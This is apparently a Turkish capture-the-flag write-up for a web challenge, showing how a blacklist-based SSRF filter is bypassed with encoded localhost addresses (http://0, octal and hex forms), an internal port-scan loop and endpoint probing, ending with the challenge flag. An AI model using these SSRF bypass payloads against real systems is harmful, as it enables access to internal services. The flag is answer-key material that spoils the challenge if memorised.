# 🎯 UrlValidator - Web Challenge

<p align="center">
  <img src="https://img.shields.io/badge/Web-Challenge-darkblue?style=for-the-badge" alt="Web">
  <img src="https://img.shields.io/badge/Difficulty-Orta-darkorange?style=for-the-badge&logo=target" alt="Difficulty">
  <img src="https://img.shields.io/badge/Type-SSRF Bypass-purple?style=for-the-badge" alt="SSRF">
</p>

---

## 📋 Soru Bilgileri
  
**Kategori:** Web  
**Seviye:** Orta  
**Puan:** 600

**Challenge URL:** http://64.226.74.243:2004/

---

## 🔍 Analiz

**Hedef:** Blacklist tabanlı SSRF korumasını bypass ederek internal /flag endpoint'ine erişmek

**Strateji:** Web uygulamasını incele → Blacklist kurallarını tespit et → Bypass teknikleri dene → Port scanning → Endpoint discovery → Flag

**İpuçları:**
- 🎯 "Enterprise-grade SSRF protection" → Blacklist filtreleme var
- 🔍 "Blacklist tabanlı" → Alternative IP representations ile bypass
- 💡 URL validator → Server-side request yapılıyor
- 🚨 String matching → Encoding bypass mümkün

---

## ✅ Çözüm Adımları

### 🌐 **Adım 1: Hedef Sayfayı İnceleme**

**Siteye curl ile bağlanıyoruz:**

```bash
curl -v http://64.226.74.243:2004/
```

**Gözlemler:**
- ✅ Başlık: "Advanced URL Validator"
- ✅ Güvenlik Badge'i: "🔒 SECURED WITH BLACKLIST"
- ✅ Açıklama: "Enterprise-grade URL security checker with SSRF protection"
- ✅ Güvenlik Özellikleri:
  - Blocks localhost access attempts
  - Prevents internal network scanning
  - Validates URL format and safety
- ✅ Form: `/validate` endpoint'ine GET isteği ile `url` parametresi gönderiyor

**Analiz:**
- ✅ URL validation sistemi mevcut
- ✅ Blacklist koruması var
- ⚠️ SSRF zafiyeti olabilir
- 💡 Bypass teknikleri gerekecek

---

### 🔎 **Adım 2: Normal URL Testi**

**Geçerli bir dış URL deneyelim:**

```bash
curl "http://64.226.74.243:2004/validate?url=https://google.com"
```

**Sonuç:**
```
✅ URL Validated Successfully
Final URL: https://www.google.com/
Status Code: 200
Response Size: 17817 bytes
```

**Analiz:**
- ✅ Uygulama verilen URL'yi fetch ediyor ve içeriğini gösteriyor
- ✅ SSRF zafiyeti var!
- 💡 Şimdi localhost erişimini test edeceğiz

---

### 🚫 **Adım 3: Localhost Erişim Denemeleri**

**Klasik localhost bypass denemeleri:**

```bash
# Test 1: localhost
curl "http://64.226.74.243:2004/validate?url=http://localhost"
# Sonuç: 🚫 BLOCKED: URL contains suspicious pattern 'localhost'

# Test 2: 127.0.0.1
curl "http://64.226.74.243:2004/validate?url=http://127.0.0.1"
# Sonuç: 🚫 BLOCKED: URL contains suspicious pattern '127.'

# Test 3: 0.0.0.0
curl "http://64.226.74.243:2004/validate?url=http://0.0.0.0"
# Sonuç: 🚫 BLOCKED: URL contains suspicious pattern '0.0.0.0'
```

**Blacklist Kuralları Tespit Edildi:**
- ❌ `localhost` → Bloklanıyor
- ❌ `127.` → Bloklanıyor
- ❌ `0.0.0.0` → Bloklanıyor

**Analiz:**
- ✅ Blacklist string matching yapıyor
- ✅ IP parsing değil, string kontrolü
- 💡 Alternative IP representations denenebilir

---

### 💡 **Adım 4: SSRF Bypass Teknikleri**

**Alternative IP representations:**

```bash
# Test 1: Short IP notation
curl "http://64.226.74.243:2004/validate?url=http://0"
# ✅ BYPASS! (0.0.0.0 olarak resolve oluyor)

# Test 2: Octal encoding (127 = 0177 in octal)
curl "http://64.226.74.243:2004/validate?url=http://0177.0.0.1"
# ✅ BYPASS!

# Test 3: Hexadecimal encoding (127 = 0x7f in hex)
curl "http://64.226.74.243:2004/validate?url=http://0x7f.0.0.1"
# ✅ BYPASS!
```

**Başarılı Bypass'lar:**
- ✅ `http://0` → 0.0.0.0 olarak resolve ediliyor ama blacklist'te string olarak "0.0.0.0" aranıyor
- ✅ `http://0177.0.0.1` → Octal: 0177₈ = 127₁₀
- ✅ `http://0x7f.0.0.1` → Hex: 0x7f₁₆ = 127₁₀

**Analiz:**
- ✅ Blacklist bypass başarılı
- ✅ Encoding-based bypass çalışıyor
- 💡 Şimdi port scanning yapacağız

---

### 🔎 **Adım 5: Port Scanning**

**Internal port scanning:**

```bash
for port in 80 443 5000 8080 8000 3000 4000 5001 9000; do
  echo "=== Port $port ==="
  curl -s "http://64.226.74.243:2004/validate?url=http://0:$port" | grep -E "(Status Code|Final URL)"
done
```

**Sonuç:**
```
=== Port 80 ===
Final URL: http://0:80/
Status Code: 200
Response Size: 3106 bytes

=== Port 443 ===
Connection refused

=== Port 8080 ===
Connection refused
```

**Analiz:**
- ✅ Sadece port 80 açık
- ✅ Uygulama aynı sunucuda çalışıyor
- 💡 Şimdi endpoint discovery yapacağız

---

### 📂 **Adım 6: Internal Endpoint Keşfi**

**Common endpoints testi:**

```bash
# Test common endpoints
curl "http://64.226.74.243:2004/validate?url=http://0/admin"
# Sonuç: 404 Not Found

curl "http://64.226.74.243:2004/validate?url=http://0/flag"
# Sonuç: 200 OK ✅

curl "http://64.226.74.243:2004/validate?url=http://0/flag.txt"
# Sonuç: 404 Not Found

curl "http://64.226.74.243:2004/validate?url=http://0/secret"
# Sonuç: 404 Not Found

curl "http://64.226.74.243:2004/validate?url=http://0/internal"
# Sonuç: 404 Not Found
```

**Endpoint Sonuçları:**
- ❌ `/admin` → 404 Not Found
- ✅ `/flag` → 200 OK
- ❌ `/flag.txt` → 404 Not Found
- ❌ `/secret` → 404 Not Found
- ❌ `/internal` → 404 Not Found

**Analiz:**
- ✅ `/flag` endpoint'i bulundu!
- 💡 Flag'i okuyabiliriz

---

### 🏆 **Adım 7: Flag'i Alma**

**/flag endpoint'ini okuyoruz:**

```bash
curl "http://64.226.74.243:2004/validate?url=http://0/flag"
```

**Response:**
```
🎉 CONGRATULATIONS! 🎉

flag{wowcomboopenredirectilessrfkesfettiniz6130dolarbounty}

You successfully exploited the SSRF vulnerability using redirect bypass!
```

---

## 🚩 **FLAG**

```
flag{wowcomboopenredirectilessrfkesfettiniz6130dolarbounty}
```

**Türkçe Anlamı:** "Wow combo open redirect ile SSRF keşfettiniz, 6130 dolar bounty" 💰

---

## 🛠️ **Kullanılan Araçlar**

<table>
<tr>
<td align="center">🌐<br><b>curl</b><br><sub>HTTP requests</sub></td>
<td align="center">🔍<br><b>bash</b><br><sub>Scripting</sub></td>
<td align="center">🧪<br><b>grep</b><br><sub>Output filtering</sub></td>
</tr>
</table>

**Kullanılan Komutlar:**
```bash
# Sayfa analizi
curl -v http://64.226.74.243:2004/

# Normal URL testi
curl "http://64.226.74.243:2004/validate?url=https://google.com"

# Localhost bypass denemeleri
curl "http://64.226.74.243:2004/validate?url=http://localhost"
curl "http://64.226.74.243:2004/validate?url=http://127.0.0.1"
curl "http://64.226.74.243:2004/validate?url=http://0"

# Port scanning
for port in 80 443 5000 8080; do
  curl -s "http://64.226.74.243:2004/validate?url=http://0:$port"
done

# Flag okuma
curl "http://64.226.74.243:2004/validate?url=http://0/flag"
```

---

## 💭 **Çözüm Akış Şeması**

```
🎯 UrlValidator Challenge
            ↓
🌐 Web uygulamasını aç
   → "Advanced URL Validator"
   → "SECURED WITH BLACKLIST"
            ↓
✅ Normal URL testi
   → https://google.com → ✅ Başarılı
   → SSRF zafiyeti var!
            ↓
🚫 Localhost erişim denemeleri
   → http://localhost → ❌ BLOCKED
   → http://127.0.0.1 → ❌ BLOCKED  
   → http://0.0.0.0 → ❌ BLOCKED
            ↓
🔍 Blacklist pattern analizi
   → 'localhost' → Bloklanıyor
   → '127.' → Bloklanıyor
   → '0.0.0.0' → Bloklanıyor
            ↓
💡 Bypass teknikleri
   → http://0 → ✅ BYPASS!
   → http://0177.0.0.1 → ✅ BYPASS! (Octal)
   → http://0x7f.0.0.1 → ✅ BYPASS! (Hex)
            ↓
🔎 Port scanning
   → Port 80 → ✅ Açık
   → Diğer portlar → ❌ Kapalı
            ↓
📂 Endpoint discovery
   → /admin → 404
   → /flag → 200 ✅
   → /secret → 404
            ↓
🚩 flag{wowcomboopenredirectilessrfkesfettiniz6130dolarbounty}
```
